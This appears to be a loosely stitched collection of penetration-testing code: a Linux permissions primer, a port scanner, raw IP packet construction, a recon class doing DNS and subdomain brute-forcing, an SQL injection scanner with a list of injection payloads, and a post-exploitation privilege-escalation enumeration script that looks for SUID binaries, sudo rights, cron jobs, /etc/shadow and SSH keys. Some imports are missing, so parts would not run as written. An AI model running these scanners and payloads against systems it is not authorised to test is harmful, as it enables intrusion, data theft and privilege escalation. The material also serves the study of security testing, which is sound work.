Linux Permissions 
# Permission Structure:
# rwx rwx rwx
# │││ │││ │││
# │││ │││ └── Others (o)
# │││ └┴┴──── Group (g)
# └┴┴──────── Owner (u)

# Numeric Representation:
# r = 4, w = 2, x = 1
# rwx = 4+2+1 = 7
# r-x = 4+0+1 = 5
# r-- = 4+0+0 = 4

# Common permissions:
chmod 755 script.sh    # rwxr-xr-x (owner: rwx, others: r-x)
chmod 644 file.txt     # rw-r--r-- (owner: rw-, others: r--)
chmod 600 secret.key   # rw------- (owner only)

# Special permissions:
chmod +s file          # Set SUID/SGID
chmod +t dir           # Sticky bit (only owner can delete)
Permission File Directory Security Impact
r (read) View file contents List directory contents Information disclosure
w (write) Modify file contents Create/delete files in dir Data corruption, malware
x (execute) Run as program Access directory entries Code execution
s (SUID) Run as file owner - Privilege escalation

def tcp_scan(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    sock.close()
    return result == 0

# Layer 3: IP packet creation
def create_ip_packet(src_ip, dst_ip):
    # IP Header fields
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    # Pack the IP header
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl,
        ip_proto, ip_check, ip_saddr, ip_daddr)
    
    return ip_header

import requests
import dns.resolver
import whois
import socket
from bs4 import BeautifulSoup

class AdvancedRecon:
    def __init__(self, target):
        self.target = target
        self.results = {}
    
    def dns_enumeration(self):
        """Enumerate DNS records"""
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for record in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record)
                records[record] = [str(rdata) for rdata in answers]
            except:
                continue
        
        self.results['dns'] = records
        return records
    
    def subdomain_discovery(self, wordlist):
        """Brute force subdomains"""
        found = []
        with open(wordlist, 'r') as f:
            subdomains = [line.strip() for line in f]
        
        for sub in subdomains:
            domain = f"{sub}.{self.target}"
            try:
                socket.gethostbyname(domain)
                found.append(domain)
                print(f"[+] Found: {domain}")
            except socket.gaierror:
                continue
        
        self.results['subdomains'] = found
        return found
    
    def whois_lookup(self):
        """Get WHOIS information"""
        try:
            w = whois.whois(self.target)
            self.results['whois'] = {
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers,
                'emails': w.emails
            }
            return self.results['whois']
        except:
            return None
    
    def port_scan(self, ports=[21,22,23,25,53,80,443,445,3306,3389]):
        """Scan common ports"""
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} is OPEN")
        
        self.results['open_ports'] = open_ports
        return open_ports
    
    def web_technologies(self):
        """Detect web technologies"""
        tech = {}
        try:
            resp = requests.get(f"http://{self.target}", timeout=5)
            headers = resp.headers
            
            # Check common headers
            if 'Server' in headers:
                tech['server'] = headers['Server']
            if 'X-Powered-By' in headers:
                tech['powered_by'] = headers['X-Powered-By']
            
            # Check for common frameworks in HTML
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Check for WordPress
            if 'wp-content' in resp.text or 'wp-includes' in resp.text:
                tech['cms'] = 'WordPress'
            
            # Check for jQuery
            if 'jquery' in resp.text.lower():
                tech['javascript'] = 'jQuery'
            
            self.results['technologies'] = tech
            return tech
        except:
            return None

import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_params = []
        
        # Common SQLi payloads
        self.payloads = [
            "'",  # Basic single quote
            "''",  # Double single quote
            "`",  # Backtick
            "\"",  # Double quote
            "' OR '1'='1",  # Always true
            "' OR '1'='1' --",  # Comment out
            "' UNION SELECT NULL--",  # Union based
            "' AND 1=1--",  # Boolean based
            "' AND 1=2--",  # Boolean false
            "' OR SLEEP(5)--",  # Time based
            "1' ORDER BY 1--",  # Column count
        ]
    
    def discover_forms(self):
        """Discover all forms on target page"""
        forms = []
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action'),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    input_info = {
                        'name': input_tag.get('name'),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_info['inputs'].append(input_info)
                
                forms.append(form_info)
            
            return forms
        except:
            return []
    
    def test_parameter(self, url, method, params):
        """Test a specific parameter for SQLi"""
        for payload in self.payloads:
            test_params = params.copy()
            
            # Inject payload into each parameter
            for param_name in test_params:
                if test_params[param_name]:  # Don't test empty values
                    original = test_params[param_name]
                    test_params[param_name] = original + payload
                    
                    try:
                        if method == "GET":
                            response = self.session.get(url, params=test_params, timeout=5)
                        else:
                            response = self.session.post(url, data=test_params, timeout=5)
                        
                        # Check for SQL error messages
                        error_patterns = [
                            r"You have an error in your SQL syntax",
                            r"Warning: mysql",
                            r"Unclosed quotation mark",
                            r"PostgreSQL.*ERROR",
                            r"ORA-[0-9]{5}",
                            r"Microsoft OLE DB Provider",
                            r"Incorrect syntax near"
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                print(f"[!] SQLi found in {param_name}")
                                print(f"    Payload: {payload}")
                                print(f"    URL: {response.url}")
                                return True
                        
                        # Time-based detection
                        if "SLEEP" in payload.upper():
                            start_time = time.time()
                            if method == "GET":
                                self.session.get(url, params=test_params, timeout=10)
                            else:
                                self.session.post(url, data=test_params, timeout=10)
                            elapsed = time.time() - start_time
                            
                            if elapsed > 4:  # Significant delay
                                print(f"[!] Time-based SQLi in {param_name}")
                                return True
                    
                    except requests.exceptions.Timeout:
                        if "SLEEP" in payload.upper():
                            print(f"[!] Time-based SQLi (timeout) in {param_name}")
                            return True
                    except:
                        continue
                    
                    # Reset parameter
                    test_params[param_name] = original
        
        return False
    
    def scan(self):
        """Main scanning function"""
        print(f"[*] Scanning {self.target_url} for SQL injection vulnerabilities")
        
        forms = self.discover_forms()
        print(f"[*] Found {len(forms)} forms")
        
        for form in forms:
            action = form['action']
            method = form['method']
            
            # Build full URL
            if action:
                full_url = urljoin(self.target_url, action)
            else:
                full_url = self.target_url
            
            # Prepare parameters
            params = {}
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] != 'submit':
                    params[input_field['name']] = input_field['value'] or 'test'
            
            print(f"[*] Testing form: {full_url} ({method})")
            
            if self.test_parameter(full_url, method, params):
                self.vulnerable_params.append({
                    'url': full_url,
                    'method': method,
                    'params': params
                })
        
        return self.vulnerable_params

#!/usr/bin/env python3
"""
Linux Privilege Escalation Enumeration Script
Run after obtaining initial shell access
"""

import os
import subprocess
import json
from datetime import datetime

class LinPEAS:
    def __init__(self):
        self.results = {}
        self.colors = {
            'RED': '\033[91m',
            'GREEN': '\033[92m',
            'YELLOW': '\033[93m',
            'BLUE': '\033[94m',
            'END': '\033[0m'
        }
    
    def run_command(self, cmd):
        """Execute command and return output"""
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
            return result.decode('utf-8', errors='ignore').strip()
        except:
            return ""
    
    def check_sudo(self):
        """Check sudo permissions"""
        print(f"{self.colors['BLUE']}[*] Checking sudo permissions...{self.colors['END']}")
        sudo_l = self.run_command("sudo -l 2>/dev/null")
        
        if sudo_l and "may run the following commands" in sudo_l:
            print(f"{self.colors['GREEN']}[+] Sudo permissions found:{self.colors['END']}")
            print(sudo_l)
            self.results['sudo'] = sudo_l
            
            # Check for dangerous binaries
            dangerous_binaries = ['find', 'vim', 'nano', 'awk', 'perl', 'python', 'ruby']
            for binary in dangerous_binaries:
                if binary in sudo_l.lower():
                    print(f"{self.colors['YELLOW']}[!] Dangerous binary allowed: {binary}{self.colors['END']}")
    
    def check_suid(self):
        """Check SUID binaries"""
        print(f"\n{self.colors['BLUE']}[*] Checking SUID binaries...{self.colors['END']}")
        suid_binaries = self.run_command("find / -perm -4000 -type f 2>/dev/null")
        
        if suid_binaries:
            dangerous_suid = [
                'nmap', 'vim', 'find', 'bash', 'more', 'less',
                'nano', 'cp', 'mv', 'awk', 'sed', 'perl',
                'python', 'ruby', 'php', 'tar', 'zip'
            ]
            
            for binary in dangerous_suid:
                if binary in suid_binaries:
                    print(f"{self.colors['YELLOW']}[!] Dangerous SUID binary: {binary}{self.colors['END']}")
            
            self.results['suid'] = suid_binaries.split('\n')
    
    def check_cron(self):
        """Check cron jobs"""
        print(f"\n{self.colors['BLUE']}[*] Checking cron jobs...{self.colors['END']}")
        
        # System cron
        cron_files = ['/etc/crontab', '/etc/cron.d/*', '/etc/cron.daily/*',
                      '/etc/cron.hourly/*', '/etc/cron.monthly/*', '/etc/cron.weekly/*']
        
        for cron_file in cron_files:
            if os.path.exists(cron_file.replace('*', '')):
                content = self.run_command(f"cat {cron_file} 2>/dev/null")
                if content and "root" in content:
                    print(f"{self.colors['GREEN']}[+] Cron file found: {cron_file}{self.colors['END']}")
                    self.results['cron'] = self.results.get('cron', []) + [cron_file]
        
        # User cron
        user_cron = self.run_command("crontab -l 2>/dev/null")
        if user_cron:
            print(f"{self.colors['GREEN']}[+] User cron jobs found{self.colors['END']}")
            self.results['user_cron'] = user_cron
    
    def check_processes(self):
        """Check running processes"""
        print(f"\n{self.colors['BLUE']}[*] Checking running processes...{self.colors['END']}")
        processes = self.run_command("ps aux")
        
        # Look for interesting processes
        interesting = ['mysql', 'postgres', 'redis', 'docker', 'kube',
                      'ssh', 'apache', 'nginx', 'tomcat']
        
        for proc in interesting:
            if proc in processes.lower():
                print(f"{self.colors['GREEN']}[+] Found interesting process: {proc}{self.colors['END']}")
        
        self.results['processes'] = processes
    
    def check_network(self):
        """Check network connections"""
        print(f"\n{self.colors['BLUE']}[*] Checking network connections...{self.colors['END']}")
        
        # Listening ports
        netstat = self.run_command("netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null")
        if netstat:
            print(f"{self.colors['GREEN']}[+] Listening ports:{self.colors['END']}")
            print(netstat)
            self.results['listening_ports'] = netstat
        
        # Established connections
        connections = self.run_command("netstat -tan 2>/dev/null || ss -tan 2>/dev/null")
        if connections:
            self.results['connections'] = connections
    
    def check_filesystem(self):
        """Check interesting files and directories"""
        print(f"\n{self.colors['BLUE']}[*] Checking filesystem...{self.colors['END']}")
        
        # World-writable directories
        ww_dirs = self.run_command("find / -type d -perm -0002 -exec ls -ld {} \\; 2>/dev/null | grep -v proc")
        if ww_dirs:
            print(f"{self.colors['YELLOW']}[!] World-writable directories:{self.colors['END']}")
            print(ww_dirs)
            self.results['world_writable'] = ww_dirs
        
        # Check for sensitive files
        sensitive_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/ssh/ssh_config',
            '/home/*/.ssh/id_rsa', '/home/*/.ssh/authorized_keys',
            '/var/log/auth.log', '/var/log/syslog'
        ]
        
        for file_pattern in sensitive_files:
            if '*' in file_pattern:
                files = self.run_command(f"ls -la {file_pattern} 2>/dev/null")
                if files:
                    print(f"{self.colors['GREEN']}[+] Found: {file_pattern}{self.colors['END']}")
                    self.results['sensitive_files'] = self.results.get('sensitive_files', []) + [file_pattern]
            elif os.path.exists(file_pattern):
                perms = self.run_command(f"ls -la {file_pattern}")
                print(f"{self.colors['GREEN']}[+] Found: {file_pattern}{self.colors['END']}")
                print(perms)
                self.results['sensitive_files'] = self.results.get('sensitive_files', []) + [file_pattern]
    
    def run_all_checks(self):
        """Run all enumeration checks"""
        print(f"{self.colors['BLUE']}{'='*60}{self.colors['END']}")
        print(f"{self.colors['YELLOW']}   Linux Privilege Escalation Enumeration Script")
        print(f"   Run time: {datetime.now()}")
        print(f"{self.colors['BLUE']}{'='*60}{self.colors['END']}\n")
        
        self.check_sudo()
        self.check_suid()
        self.check_cron()
        self.check_processes()
        self.check_network()
        self.check_filesystem()
        
        # Save results
        with open('linpeas_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
